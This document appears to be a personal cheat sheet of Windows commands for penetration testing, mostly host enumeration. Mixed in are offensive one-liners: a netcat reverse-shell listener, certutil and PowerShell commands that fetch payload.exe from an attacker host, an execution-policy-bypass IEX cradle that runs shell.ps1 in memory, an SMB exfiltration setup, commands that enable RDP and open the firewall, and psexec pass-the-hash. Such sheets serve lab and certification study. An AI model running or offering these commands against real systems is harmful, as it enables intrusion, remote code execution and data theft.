---
title: Windows Commands
---

## Reverse Shell

https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1

nc -lvp 4444

## Windows Commands

Find installed patches, architecture, OS version

```powershell
systeminfo
```

Machine name

```powershell
hostname
```

What is my username?

```powershell
whoami
```

What users/localgroups are on the machine?

```powershell
net users
net localgroups
```

More info about a specific user. Check if user has privileges

```powershell
net user <user1>
```

User privilege

```powershell
whoami /priv
```

Disk Drive

```powershell
wmic logicaldisk get caption,description,providername`
```

Download file in the target machine

```powershell
certutil -urlcache -f http://[attackerIp]/payload.exe payload.exe
```

File and directory permission

```powershell
cacls /Desktop/test.txt
accesschk.exe -qwsu "<user>" "<path>"
accesschk.exe -qwsu "Users" *
```

wmic service filter

```powershell
wmic service where "name= 'OpenSSHd'" get name,pathname,status
```

List of Service

```powershell
wmic service get Caption,StartName,State,pathname
```

List of Process

```powershell
wmic process get ProcessID,ExecutablePath
```

Network

```powershell
ipconfig /all
route print
arp -A
```

Port forward & connect form linux to SMB

```powershell
# Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```

```powershell
winexe -U [user]%[password] //[IP] "cmd.exe"
```

> Note: in ssh_config uncomment PermitRootLogin yes

Firewall Configuration

```powershell
netsh firewall show state
netsh firewall show config
```

Evarioment Variable

```powershell
set
```

How well patched is the system?

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Loading Powershell scripts directly in memory

```powershell
powershell.exe -ep Bypass -c "IEX ((new-object net.webclient).downloadstring('http://10.0.1.14:80/shell.ps1'))"
```

Downlaod file with Powershell

```powershell
powershell.exe -ep Bypass -c iex ((New-Object System.Net.WebClient).DownloadFile("https://attacker/payload.exe", "C:\Users\user1\payload.exe"))
```

SMB Exfiltration

```powershell
kali_op1> impacket-smbserver -smb2support kali `pwd`
MD-Wind> net use \\10.10.14.14\kali
```

Information about process

```powershell
tasklist /v
```

Run a command as another user

```powershell
runas /user:<localmachinename>\administrator cmd
```

Process info

```powershell
wmic process get Caption,Commandline,Processid
```

Service info

```powershell
wmic service get name,status,startname,pathname
```

Process Owner

```powershell
tasklist /V /FI "IMAGENAME eq explorer.exe"
wmic process where "name='taskeng.exe'" call GetOwner
```

Process List

```powershell
powershell.exe Get-Process  | Select-Object Id,Name,Path
```

Current Connection

```powershell
netstat -lpno
```

Start and stop a service

```powershell
net start/stop servicename
```

Installed applications

```powershell
psinfo.exe -s
```

UAC is enable?

```powershell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Content of a file

```powershell
more file.txt
```

RDP from Kali

```powershell
rdesktop -u user -p password <IP> -g 95%
```

Enable rdp

```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```powershell
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

Psexec

```powershell
python3 psexec.py user:password@<ip>
```

```powershell
python3 psexec.py -hashes LMHASH:NTHASH user@<ip>
```
